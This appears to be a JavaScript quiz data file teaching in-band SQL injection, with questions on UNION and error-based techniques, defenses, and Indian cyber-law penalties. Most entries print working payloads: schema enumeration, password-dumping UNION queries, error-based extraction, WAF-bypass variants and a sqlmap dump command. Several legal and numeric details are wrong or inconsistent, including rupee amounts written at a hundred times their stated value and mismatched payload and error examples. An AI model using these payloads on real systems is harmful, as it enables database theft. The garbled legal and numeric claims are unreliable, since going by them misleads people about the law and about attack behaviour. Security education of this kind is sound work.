const questions = [
  {
    question: "What is 'In-Band SQL Injection' (Classic SQLi), and what are its Two Primary Variations?",
    shortAnswer: "In-Band SQL Injection occurs when the attacker uses the exact same communication channel (HTTP request and response) to launch the attack and receive the extracted database records; its two primary variations are UNION-Based SQLi and Error-Based SQLi.",
    explanation: "Unlike Blind SQLi (which requires inferring data from boolean states or time delays), In-Band SQLi delivers exfiltrated data directly on the screen. In UNION-based attacks, data is appended to the visible HTML page. In Error-based attacks, data is reflected inside verbose database error messages.",
    hint: "The direct form of SQL injection where the stolen data is printed right on the website page.",
    level: "basic",
    codeExample: `// In-Band SQL Injection Taxonomy:
// 1. UNION-Based SQLi: Appends custom SELECT results directly to the visible web page!
// 2. Error-Based SQLi: Forces the database to throw an error containing the stolen data!`
  },
  {
    question: "What are the Two Strict Mathematical Conditions required for a 'UNION-Based SQL Injection' query to execute successfully?",
    shortAnswer: "1. The injected query must return the EXACT same number of columns as the original query (K_orig = K_inject); 2. The data types of corresponding columns must be compatible between the original and injected queries.",
    explanation: "The SQL `UNION` operator merges the result sets of two queries. If Query 1 returns 3 columns (`id, name, price`) and Query 2 returns 2 columns (`user, pass`), the database engine rejects the statement with a syntax error. Furthermore, if Column 3 in Query 1 is an integer, Column 3 in Query 2 must be an integer or convertible type.",
    hint: "Both queries must have the exact same number of columns and matching data types.",
    level: "moderate",
    codeExample: `// UNION Conditions in Action:
// Original Query : SELECT id, product_name, price FROM items (3 Columns)
// Valid UNION    : UNION SELECT 1, username, password FROM users-- (3 Columns, Compatible Types ➔ SUCCESS!)
// Invalid UNION  : UNION SELECT username, password FROM users-- (2 Columns ➔ FAILS WITH ERROR!)`
  },
  {
    question: "How do Attackers determine the Exact Number of Columns in a Vulnerable Query using the `ORDER BY` Technique?",
    shortAnswer: "By injecting incrementing column index numbers (`ORDER BY 1--`, `ORDER BY 2--`, `ORDER BY 3--`) until the database throws an error (e.g. 'The ORDER BY position number 4 is out of range'); the last successful number is the exact column count ($K = 3$).",
    explanation: "SQL allows ordering by column index rather than column name. If an attacker injects `ORDER BY 3--` and the page loads normally, at least 3 columns exist. When the attacker injects `ORDER BY 4--` and the page crashes or returns an error, the attacker knows the query selects exactly 3 columns.",
    hint: "Counting up with ORDER BY 1, 2, 3... until the page breaks to find how many columns exist.",
    level: "moderate",
    codeExample: `// ORDER BY Column Count Determination:
// Request 1: /items?id=1 ORDER BY 1-- ➔ 200 OK
// Request 2: /items?id=1 ORDER BY 2-- ➔ 200 OK
// Request 3: /items?id=1 ORDER BY 3-- ➔ 200 OK
// Request 4: /items?id=1 ORDER BY 4-- ➔ 500 Error: "ORDER BY position 4 is out of range"
// Conclusion: The original query has EXACTLY 3 columns!`
  },
  {
    question: "How does an Attacker Determine which Columns in a UNION Query can Hold Text/String Data using `NULL` Placeholders?",
    shortAnswer: "By replacing columns with `NULL` (which is compatible with any data type) and systematically substituting one `NULL` at a time with a test string (`'test'`) until the query executes without type conversion errors.",
    explanation: "If an attacker knows there are 3 columns, they test: 1. `UNION SELECT 'test', NULL, NULL--` (if it errors, Column 1 cannot hold strings). 2. `UNION SELECT NULL, 'test', NULL--` (if it succeeds, Column 2 can hold strings). 3. `UNION SELECT NULL, NULL, 'test'--`. The attacker then injects exfiltration functions (like `password`, `database()`, `version()`) into the confirmed string-compatible columns.",
    hint: "Testing 'UNION SELECT NULL, NULL, NULL' and replacing NULL with text one by one.",
    level: "expert",
    codeExample: `// Finding String-Compatible Columns:
// Test 1: UNION SELECT 'test', NULL, NULL-- ➔ Error: Column 1 is INT (Incompatible!)
// Test 2: UNION SELECT NULL, 'test', NULL-- ➔ 200 OK: Column 2 holds STRING!
// Final Payload: UNION SELECT NULL, username || ':' || password, NULL FROM users--`
  },
  {
    question: "Under the Indian Information Technology Act 2000 Section 66F, what constitutes the criminal penalty for executing UNION-Based SQL Injection to exfiltrate Classified Defense or Power Grid Databases?",
    shortAnswer: "Using UNION-based SQL injection to extract confidential databases from critical national information infrastructure to threaten national security is CYBER TERRORISM, punishable with IMPRISONMENT FOR LIFE.",
    explanation: "Section 66F of the IT Act defines Cyber Terrorism. If an adversary executes an in-band UNION query against state power grid databases in Barrackpore or nuclear facility telemetry in West Bengal, the offense carries mandatory Life Imprisonment.",
    hint: "Section 66F prescribes Life Imprisonment for Cyber Terrorism attacks on critical infrastructure.",
    level: "basic",
    codeExample: `// Statutory Offense (IT Act Section 66F - Cyber Terrorism):
// Offense: Executing UNION SQL injection to dump grid telemetry databases on 220kV power transmission systems
// Penalty: IMPRISONMENT FOR LIFE`
  },
  {
    question: "How do Attackers Harvest Database Metadata (`information_schema.tables` and `information_schema.columns`) in MySQL and PostgreSQL via UNION SQLi?",
    shortAnswer: "By querying the standard ANSI `information_schema` views using UNION queries to list all database names, table names (`table_name FROM information_schema.tables`), and column names (`column_name FROM information_schema.columns`).",
    explanation: "In modern RDBMS engines, `information_schema` acts as a built-in catalog. An attacker executes: `' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema = database()--` to list all tables. Next, they query: `' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name = 'users'--` to discover column names (`username`, `password_hash`), preparing for the final data exfiltration query.",
    hint: "Querying the information_schema catalog to discover all hidden table and column names in the database.",
    level: "expert",
    codeExample: `// Step-by-Step Database Schema Enumeration:
// Step 1 (Current DB): ' UNION SELECT 1, database(), version()--
// Step 2 (List Tables): ' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database()--
// Step 3 (List Columns): ' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='users'--
// Step 4 (Dump Data)  : ' UNION SELECT 1, username, password FROM users--`
  },
  {
    question: "What is 'Error-Based SQL Injection' and how does it Exploit Type Conversion Errors in Microsoft SQL Server and PostgreSQL?",
    shortAnswer: "An attack where the adversary intentionally injects functions (like `CAST()` or `CONVERT()`) that attempt to convert a subquery's string result into an integer, forcing the database engine to include the confidential string data inside the verbose error message displayed on the page.",
    explanation: "In MSSQL: `' AND 1=CAST((SELECT TOP 1 password FROM users) AS INT)--`. The database executes the subquery `(SELECT password...)`, which returns the string `'SecretPass2026'`. It then tries to cast `'SecretPass2026'` into an integer. Because string-to-int conversion fails, the database crashes with: `Conversion failed when converting the varchar value 'SecretPass2026' to data type int.` The password is leaked directly inside the error message.",
    hint: "Forcing the database to convert a text password into a number so the database error message prints the password.",
    level: "expert",
    codeExample: `// MSSQL Error-Based Payload:
// Injected Payload: ' AND 1=CONVERT(INT, (SELECT TOP 1 password FROM users))--
// Returned Error  : Conversion failed when converting the varchar value 'AdminSecretPass!' to data type int.`
  },
  {
    question: "Under the Digital Personal Data Protection (DPDP) Act 2023 Section 8(5) and Section 33, what are the enterprise liabilities if Error-Based SQLi leaks citizen medical records?",
    shortAnswer: "Failing to suppress verbose database error messages and un-parameterized queries resulting in personal data leaks triggers statutory penalties up to ₹250 Crores by the Data Protection Board of India.",
    explanation: "Section 8(5) mandates reasonable security safeguards. If a healthcare provider in West Bengal leaves verbose database stack traces enabled, allowing attackers to dump patient oncology records via error-based SQLi, Section 33 prescribes fines up to ₹250 Crores.",
    hint: "Failing to protect personal health records from SQL error leakage triggers fines up to ₹250 Crores.",
    level: "moderate",
    codeExample: `// DPDP Statutory Compliance Standard:
// Legal Section: Section 8(5) & Section 33 DPDP Act 2023
// Maximum Penalty: Up to ₹250,00,00,000 (Rupees 250 Crores) for negligent error-based database leaks`
  },
  {
    question: "How does 'Error-Based SQL Injection' work in MySQL using the `ExtractValue()` and `UpdateXML()` XPath Functions?",
    shortAnswer: "By supplying an invalid XPath expression containing a subquery; MySQL's XML parser attempts to parse the expression, fails due to the tilde (`0x7e`) character, and returns an XPath syntax error containing the subquery result.",
    explanation: "In MySQL: `' AND ExtractValue(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1)))--`. The `0x7e` represents a tilde (`~`). Because `~` is not a valid XPath syntax, `ExtractValue()` throws: `XPATH syntax error: '~AdminPass2026'`. The password string is extracted directly from the error message without needing a UNION query.",
    hint: "Abusing MySQL's ExtractValue XPath XML function to make the database throw an error containing the password.",
    level: "expert",
    codeExample: `// MySQL ExtractValue Error-Based Exploit:
// Injected Payload: ' AND ExtractValue(1, CONCAT(0x7e, (SELECT password_hash FROM users LIMIT 1)))--
// MySQL Error     : XPATH syntax error: '~$2b$12$e7d705a3286e92ab...' (Hash Leaked in Error!)`
  },
  {
    question: "Under CERT-In Mandatory Directions 2022, what is the mandatory incident reporting timeline for In-Band SQL Injection data leaks?",
    shortAnswer: "All organizations in India must report security breaches and unauthorized database access resulting from SQL injection to CERT-In within 6 HOURS of detection.",
    explanation: "Under Section 70B of the IT Act and CERT-In Direction No. 20(3)/2022-CERT-In, service providers, intermediaries, data centers, and corporate bodies must mandatorily report specified cyber security incidents (including unauthorized access to database systems) to CERT-In within 6 hours of noticing them.",
    hint: "CERT-In requires mandatory incident reporting within a strict 6-hour window.",
    level: "basic",
    codeExample: `// Statutory SLA (CERT-In Mandatory Incident Reporting):
// Directive: Mandatory reporting of SQL injection database leaks within 6 HOURS
// Mandate: Section 70B Information Technology Act 2000`
  },
  {
    question: "What is 'String Concatenation in UNION SQL Injection' (e.g. `GROUP_CONCAT` in MySQL or `STRING_AGG` in PostgreSQL)?",
    shortAnswer: "Functions that aggregate multiple rows of database records into a single formatted string, allowing attackers to exfiltrate an entire database table in a single HTTP request.",
    explanation: "If a UNION query only displays one row on the screen, an attacker uses aggregation functions. In MySQL: `' UNION SELECT 1, GROUP_CONCAT(username, ':', password SEPARATOR ' | '), 3 FROM users--`. The database concatenates all 500 user accounts into a single string (`admin:pass1 | alice:pass2 | bob:pass3`), dumping the entire table in one response.",
    hint: "Using GROUP_CONCAT or STRING_AGG to combine hundreds of rows into one single text string.",
    level: "moderate",
    codeExample: `// Multi-Row Aggregation Payloads:
// MySQL / MariaDB  : ' UNION SELECT 1, GROUP_CONCAT(username, ':', password), 3 FROM users--
// PostgreSQL       : ' UNION SELECT 1, string_agg(username || ':' || password, ' | '), 3 FROM users--
// SQLite           : ' UNION SELECT 1, group_concat(username || ':' || password), 3 FROM users--`
  },
  {
    question: "Under the Indian IT Act Section 43(a), what constitutes civil liability for dumping customer databases using UNION SQL Injection?",
    shortAnswer: "Securing access and extracting or copying data from a computer system without permission of the owner carries compensation by way of damages up to ₹1 Crore.",
    explanation: "Section 43(a) explicitly penalizes unauthorized data extraction: 'If any person without permission of the owner... accesses or secures access to such computer... he shall be liable to pay damages by way of compensation not exceeding one crore rupees.'",
    hint: "Section 43(a) provides civil compensation up to ₹1 Crore for unauthorized data extraction.",
    level: "basic",
    codeExample: `// Statutory Liability (IT Act Section 43(a)):
// Violation: Using UNION SQL injection to dump 50,000 credit card records from a Kolkata e-commerce database
// Compensation: Up to ₹1,00,00,00,000 (Rupees One Crore) per affected entity`
  },
  {
    question: "Why do Attackers Prepend a False Condition (e.g. `id = -1` or `id = 0`) to the Original Query before a UNION Statement?",
    shortAnswer: "To force the original query to return zero rows, ensuring that the web application's HTML template displays the attacker's injected UNION query results as the very first and only displayed record.",
    explanation: "Many web applications only render the first row returned by a query (`results[0]`). If the original query returns a valid product (Row 1 = 'Laptop'), the attacker's UNION result (Row 2 = 'Admin Password') is ignored by the UI. Setting `id = -1 UNION SELECT ...` ensures Row 1 is empty, forcing the application to render the attacker's UNION data on the screen.",
    hint: "Setting the original ID to -1 so the legitimate product is empty and only your injected data shows up.",
    level: "moderate",
    codeExample: `// Suppressing Original Result Set:
// Submitting: /product?id=1 UNION SELECT 1, password, 3 FROM users-- ➔ Displays Product 1 (UNION data hidden!)
// Submitting: /product?id=-1 UNION SELECT 1, password, 3 FROM users-- ➔ Displays 'AdminPassword' in the Title slot!`
  },
  {
    question: "What is 'Database Error Suppression and Generic Error Pages' in SQLi Defense?",
    shortAnswer: "Configuring the web server and database driver to catch all database exceptions and display generic friendly error pages (e.g. 'An unexpected error occurred'), completely neutralizing Error-Based SQL injection.",
    explanation: "Error-based SQLi requires the raw database error message to be returned in the HTTP response. By enabling `display_errors = Off` in PHP, setting `NODE_ENV = production` in Express, and using global try/catch exception handlers that return generic 500 error pages, attackers cannot read data out of error messages.",
    hint: "Turning off detailed programming error messages in production so errors never show passwords or SQL code.",
    level: "moderate",
    codeExample: `// Production Error Handling Middleware (Express.js):
app.use((err, req, res, next) => {
    logger.error({ event: 'DATABASE_ERROR', message: err.message, stack: err.stack });
    // NEVER expose err.message to the client! Return generic message:
    res.status(500).json({ error: "An internal server error occurred. Please try again later." });
});`
  },
  {
    question: "Under the Indian IT Act Section 66, what constitutes the criminal penalty for using automated tools (like SQLmap) to execute In-Band SQLi?",
    shortAnswer: "Dishonestly or fraudulently hacking or diminishing the utility of computer systems carries imprisonment up to 3 years and fines up to ₹5 Lakhs.",
    explanation: "Section 66 criminalizes fraudulent computer disruption: 'If any person, dishonestly or fraudulently, does any act referred to in section 43... he shall be punishable with imprisonment for a term which may extend to three years or with fine which may extend to five lakh rupees, or with both.'",
    hint: "Section 66 provides up to 3 years imprisonment and ₹5 Lakh fine for fraudulent computer hacking.",
    level: "basic",
    codeExample: `// Statutory Penalty (IT Act Section 66):
// Offense: Running SQLmap against Salt Lake financial settlement gateways to execute UNION-based dumps
// Penalty: Up to 3 Years Imprisonment + Fine up to ₹5,00,00,000`
  },
  {
    question: "What is 'Oracle Dual Table' Requirement in Oracle UNION-Based SQL Injection?",
    shortAnswer: "Unlike MySQL or PostgreSQL, Oracle SQL syntax strictly mandates a `FROM` clause in every `SELECT` query; attackers must append `FROM dual` (or `FROM all_tables`) to their injected UNION statements (`UNION SELECT 'test' FROM dual--`).",
    explanation: "In MySQL, `SELECT 1, 2, 3` is valid. In Oracle, `SELECT 1, 2, 3` throws a syntax error. Oracle maintains a built-in single-row table named `dual`. An attacker targeting Oracle must formulate: `' UNION SELECT 1, banner, 3 FROM v$version--` or `' UNION SELECT 'a', 'b' FROM dual--` to satisfy Oracle's grammar parser.",
    hint: "Oracle requires 'FROM dual' in every SELECT query, unlike MySQL or PostgreSQL.",
    level: "expert",
    codeExample: `// Oracle UNION Query Syntax:
// Invalid in Oracle : ' UNION SELECT 1, 2, 3-- (Throws Syntax Error: missing FROM clause!)
// Valid in Oracle   : ' UNION SELECT 1, 'admin', 3 FROM dual-- (Succeeds!)
// Oracle Banner Dump: ' UNION SELECT 1, banner, 3 FROM v$version WHERE rownum=1--`
  },
  {
    question: "Synthesize an enterprise-scale Multi-Tier Defense Architecture against In-Band SQL Injection.",
    shortAnswer: "A defense-in-depth framework combining 100% Parameterized Prepared Statements, Global Production Database Error Masking, Positive Schema Validation (Joi/Zod), Least Privilege Database Accounts, and Cloud WAF Inspection (OWASP CRS).",
    explanation: "To achieve complete immunity against UNION and Error-based SQLi: 1. Code Tier: 100% Prepared Statements (compiles AST first, making UNION appending impossible). 2. Error Handling: Global exception masking returning generic 500 error pages (defeating Error-based extraction). 3. Database Tier: Principle of Least Privilege (revoking `information_schema` and system view access from application users). 4. Perimeter: Cloud WAF dropping requests containing `UNION ALL SELECT` or `ExtractValue` signatures.",
    hint: "Combine 100% Prepared Statements, production error masking, least privilege database accounts, and Cloud WAF.",
    level: "expert",
    codeExample: `// Master In-Band SQLi Defense Blueprint:
// 1. Prepared Statements : db.execute("SELECT * FROM items WHERE id = ?", [safeId]);
// 2. Global Error Masking: res.status(500).json({ error: "Generic System Error" }); (display_errors = Off)
// 3. Database Privileges : REVOKE SELECT ON information_schema.tables FROM 'webapp'@'localhost';
// 4. Perimeter WAF       : AWS WAF Core Rule Set filtering 'UNION SELECT' & 'ExtractValue' metacharacters`
  },
  {
    question: "What is 'WAF Bypassing for UNION SQLi' using Non-Standard Keywords and Whitespace Bypass?",
    shortAnswer: "Techniques used by adversaries to bypass simple WAF keyword filters, including using `UNION ALL SELECT`, mixed-case `uNiOn aLl sElEcT`, inline comments `UNION/**/ALL/**/SELECT`, and URL encoding `%55NION`.",
    explanation: "Weak WAFs often look for exact strings like `UNION SELECT`. Attackers bypass this by: 1. Adding `ALL`: `UNION ALL SELECT` (returns duplicates, bypassing `UNION SELECT` regex). 2. Comment separators: `UNION/**/SELECT` or `UNION%0aSELECT` (newline separator). 3. URL double encoding: `%2555NION`. Prepared statements remain completely immune because the database never parses user input as SQL keywords.",
    hint: "Using UNION ALL or comments like /**/ to trick firewalls while the database still runs the query.",
    level: "expert",
    codeExample: `// WAF Bypass Payload Variants for UNION SQLi:
// Filter Target : Block exact phrase "UNION SELECT"
// Bypass Payload: ' UNION ALL SELECT NULL, password, NULL FROM users--
// Inline Comment: '/**/UNION/**/ALL/**/SELECT/**/NULL,password,NULL/**/FROM/**/users--`
  },
  {
    question: "Under the Indian Penal Code Section 427, what constitutes 'Mischief' via In-Band SQL Injection Exploits?",
    shortAnswer: "Intentionally altering, corrupting, or extracting confidential database records via in-band SQL injection that diminishes their value or utility, punishable with imprisonment up to 2 years and fines.",
    explanation: "Section 425/427 IPC defines Mischief. When an attacker dumps proprietary corporate databases or alters hospital patient records in West Bengal using UNION SQL injection, the act destroys electronic property utility, punishable with up to 2 years imprisonment under Section 427.",
    hint: "IPC Section 427 covers Mischief and Digital Property Damage with up to 2 years imprisonment.",
    level: "basic",
    codeExample: `// Statutory Penalty (Indian Penal Code Section 427):
// Offense: Executing UNION SQL injection to extract and dump customer databases from a Kolkata retail portal (Mischief)
// Penalty: Imprisonment for a term up to 2 Years, or with Fine, or with both`
  },
  {
    question: "What is 'Error-Based SQLi using BigInt Numeric Overflow' in MySQL?",
    shortAnswer: "An attack where mathematical functions (like `exp(710)` or `~0 + !0`) exceed the 64-bit BigInt maximum storage range ($2^{64}-1$), throwing a numeric overflow error containing the subquery result.",
    explanation: "In MySQL, evaluating `exp(710)` exceeds the floating point maximum. An attacker crafts: `' OR exp(~(SELECT * FROM (SELECT password FROM users LIMIT 1)x))--`. The bitwise NOT operator `~` forces MySQL into an arithmetic overflow error, reflecting the extracted password inside the error message.",
    hint: "Making the database calculate numbers that are too huge for its memory so it throws an overflow error with the password.",
    level: "expert",
    codeExample: `// MySQL BigInt Overflow Payload:
// Payload : ' OR !(SELECT * FROM (SELECT password FROM users LIMIT 1)x)-~0--
// Error   : DOUBLE value is out of range in 'exp(~(SELECT...))' (Data Leaked in Error!)`
  },
  {
    question: "What is 'SQL Injection in LIMIT / OFFSET Clauses' and why is it notoriously difficult to exploit?",
    shortAnswer: "Injection occurring after the `LIMIT` clause where standard `UNION`, `ORDER BY`, or `WHERE` keywords are syntactically invalid; attackers must use dialect-specific features like MySQL `PROCEDURE ANALYSE()` or PostgreSQL stacked queries.",
    explanation: "In SQL grammar: `SELECT * FROM items LIMIT 10 OFFSET ` + input. Injecting `UNION` here is a syntax error because `UNION` must appear before `LIMIT`. In older MySQL versions, attackers injected `PROCEDURE ANALYSE(extractvalue(1, concat(0x7e, (SELECT password FROM users))), 1)`. In PostgreSQL, attackers use stacked queries (`; SELECT pg_sleep(5);`).",
    hint: "Injecting after the LIMIT keyword where normal UNION queries fail due to SQL grammar rules.",
    level: "expert",
    codeExample: `// MySQL LIMIT Injection (Older Versions):
SELECT * FROM items LIMIT 1, 10 PROCEDURE ANALYSE(EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1))), 1);`
  },
  {
    question: "Under the Indian IT Act Section 70, what constitutes the penalty for executing In-Band SQL Injection against 'Protected Systems'?",
    shortAnswer: "Securing unauthorized access or attempting to secure access to designated Protected Systems (critical infrastructure) carries imprisonment up to 10 YEARS and severe fines.",
    explanation: "Section 70 of the IT Act governs Critical Information Infrastructure (e.g. power grids in Barrackpore, financial settlement switches in Salt Lake). Launching a UNION or Error-based SQL injection attack against a designated protected system carries up to 10 years imprisonment under Section 70.",
    hint: "Section 70 carries up to 10 years imprisonment for unauthorized access to Protected Systems.",
    level: "basic",
    codeExample: `// Statutory Offense (IT Act Section 70):
// Offense: Executing UNION SQL injection on the SCADA power grid management portal
// Penalty: Imprisonment for a term up to 10 YEARS, and shall also be liable to Fine`
  },
  {
    question: "What is 'Hex Encoding in UNION SQL Injection' (e.g. `0x61646d696e`)?",
    shortAnswer: "Representing text strings as hexadecimal numbers (e.g. `0x61646d696e` for `'admin'`) in SQL queries to bypass WAFs or applications that strip single quotes.",
    explanation: "If an application strips single quotes: `input.replace(/'/g, '')`, an attacker cannot write `'users'`. In MySQL and SQLite, `0x7573657273` is the hexadecimal representation of the string `'users'`. The attacker executes: `' UNION SELECT 1, username, password FROM 0x7573657273--` or queries `WHERE table_name = 0x7573657273`, executing without a single quotation mark.",
    hint: "Writing words in hex numbers (like 0x61646d696e for admin) so you don't need to use quotation marks.",
    level: "moderate",
    codeExample: `// Hex Encoding Bypass:
// Word       : 'admin'
// ASCII Hex  : 61 64 6d 69 6e ➔ Hex Literal: 0x61646d696e
// Query      : ' UNION SELECT 1, password, 3 FROM users WHERE username = 0x61646d696e-- (Zero quotes used!)`
  },
  {
    question: "What is 'UNION-Based Data Exfiltration Speed' vs 'Blind SQLi Timing Speed'?",
    shortAnswer: "UNION-based in-band extraction transfers complete database tables in a single HTTP request (throughput ~50 KB/s to 5 MB/s); Blind timing inference extracts data at only 1 to 10 bytes per second, requiring thousands of HTTP requests.",
    explanation: "Because UNION queries return entire result sets directly in the HTTP payload, dumping 10,000 user records takes 2 to 5 HTTP requests. Time-based blind SQLi requires ~8 HTTP requests per character (evaluating each bit of every character with 5-second sleep delays), making in-band extraction 50,000 times faster.",
    hint: "UNION injection downloads an entire table in 1 second, while Blind timing injection takes hours guessing one letter at a time.",
    level: "moderate",
    codeExample: `// Extraction Speed Comparison:
// UNION-Based In-Band Extraction : 50,000 Records in 3 Seconds (High Speed ~500 KB/s)
// Time-Based Blind Extraction    : 1 Password (12 Chars) in 60 Seconds (~0.2 Bytes/s)`
  },
  {
    question: "Under the Indian Penal Code Section 420, what constitutes Cheating via UNION SQL Injection Data Dumps?",
    shortAnswer: "Dishonestly obtaining proprietary business secrets or customer financial databases using UNION SQL injection to cheat or cause wrongful gain, punishable with imprisonment up to 7 years and fines.",
    explanation: "Section 420 IPC penalizes cheating and fraudulent property transfer. If an attacker uses UNION SQL injection to dump corporate client lists or financial statements in West Bengal and sells them to competitors, they are prosecuted under Section 420 alongside the IT Act.",
    hint: "IPC Section 420 covers Cheating and Fraudulent Property Acquisition with up to 7 years imprisonment.",
    level: "basic",
    codeExample: `// Statutory Offense (Indian Penal Code Section 420):
// Offense: Using UNION SQL injection to extract proprietary corporate financial databases and trade secrets
// Penalty: Imprisonment for a term up to 7 Years, and shall also be liable to Fine`
  },
  {
    question: "What is 'CAST() vs CONVERT()' Function Behavior in Error-Based SQL Injection?",
    shortAnswer: "`CAST(expression AS type)` is the ANSI SQL standard supported in MSSQL, PostgreSQL, and Oracle; `CONVERT(type, expression)` is a dialect-specific function in MSSQL and MySQL; both are used to trigger type conversion overflow errors.",
    explanation: "Both functions serve the same attack purpose: forcing the database engine to convert an extracted string (like a password hash) into an integer data type. When the conversion fails, the engine embeds the input string in the error message: `CAST((SELECT password FROM users) AS INT)`. Parameterized queries prevent both by treating the input as data.",
    hint: "Both CAST and CONVERT are used to force the database to throw an error that prints the password.",
    level: "expert",
    codeExample: `// Syntax Comparison:
// ANSI SQL Standard (PostgreSQL / MSSQL) : CAST((SELECT password FROM users) AS INT)
// Microsoft SQL Server Dialect          : CONVERT(INT, (SELECT password FROM users))`
  },
  {
    question: "What is 'Multi-Table UNION Joins' in Complex Database Architectures?",
    shortAnswer: "Using subqueries and joins inside a UNION statement to correlate and extract data simultaneously across multiple disparate database tables (e.g. joining `users`, `bank_accounts`, and `audit_logs`).",
    explanation: "An attacker can construct sophisticated UNION statements: `' UNION SELECT u.id, u.username || ' | ' || a.account_number || ' | ' || a.balance, 3 FROM users u JOIN bank_accounts a ON u.id = a.user_id--`. A single UNION query extracts correlated user identities and financial balances across multiple tables simultaneously.",
    hint: "Joining multiple database tables inside a UNION query to steal user profiles and bank balances all at once.",
    level: "expert",
    codeExample: `// Multi-Table UNION Join Payload:
' UNION SELECT 1, u.username || ' : ' || b.account_no || ' : ' || b.balance, 3 
  FROM users u JOIN accounts b ON u.id = b.user_id--`
  },
  {
    question: "What is 'Automated In-Band SQLi Exploitation with SQLmap'?",
    shortAnswer: "How automated tools like SQLmap test column counts (`--union-cols`), probe string-compatible columns (`--union-char`), and automatically construct optimized `information_schema` dumping queries in seconds.",
    explanation: "SQLmap automates the manual In-Band testing methodology: 1. It tests `ORDER BY` ranges to find column count K. 2. It injects unique string markers (e.g. `QZXQ`) to identify which columns reflect text. 3. It queries `information_schema` to enumerate tables. 4. It executes multi-row `GROUP_CONCAT` queries to dump the entire database to disk in seconds.",
    hint: "How automated penetration testing tools figure out the column count and download the whole database in seconds.",
    level: "moderate",
    codeExample: `// SQLmap Automated In-Band Execution:
sqlmap -u "https://kolkata-fintech.in/item?id=105" --technique=U --banner --dbs --tables --dump`
  },
  {
    question: "Synthesize the mathematical formulation of Column Count Determination (K), Relational Union Compatibility, Error-Vector Reflection, and Data Extraction Throughput.",
    shortAnswer: "Column count is K = max { k in N | Query(ORDER BY k) != Error }; Relational UNION compatibility requires K_orig = K_inject and Type(C_i) == Type(C'_i); In-Band throughput is T_in-band = (Bytes_payload * N_rows) / RTT, exceeding Blind inference by 50,000x; Prepared Statements force K_inject = 0, driving T_in-band = 0.00 bytes/s.",
    explanation: "Let the original query result set relation be R_1 subset of D_1 × D_2 × ... × D_K of arity K. A UNION query creates relation R_2 subset of D'_1 × D'_2 × ... × D'_{K'}. The relational union R_1 UNION R_2 is well-formed if and only if K = K' and domain compatibility holds: D_i congruent D'_i for all i in {1, ..., K}. In-band data throughput is: T_in-band = S_page / t_RTT ≈ 50 KB/s, compared to Time-based blind inference T_blind = 1 / (8 × t_sleep) ≈ 0.025 bytes/s. Deploying Parameterized Prepared Statements compiles the query AST with K_inject = 0, mathematically guaranteeing T_in-band = 0.00 bytes/s (100% data insulation).",
    hint: "Mathematical proof formula showing that relational UNION requires matching arity K and compatible domains, achieving 50 KB/s throughput, while Prepared Statements drive throughput to 0.00 bytes/s.",
    level: "expert",
    codeExample: `// In-Band SQLi Throughput & Relational Compatibility Mathematical Proof:
// Column Count: K = max { k | ORDER BY k != Error } = 3 Columns
// UNION Compatibility: Arity(R_1) = 3 == Arity(R_2) = 3 (Domain Compatible!)
// In-Band Extraction Throughput: T_in-band = 50,000 bytes / 0.1s = 500,000 bytes/s (500 KB/s)
// Prepared Statement Defense: Arity(R_inject) = 0 ➔ Throughput = 0.00 bytes/s (100% IMMUNE!)`
  }
];

export default questions;
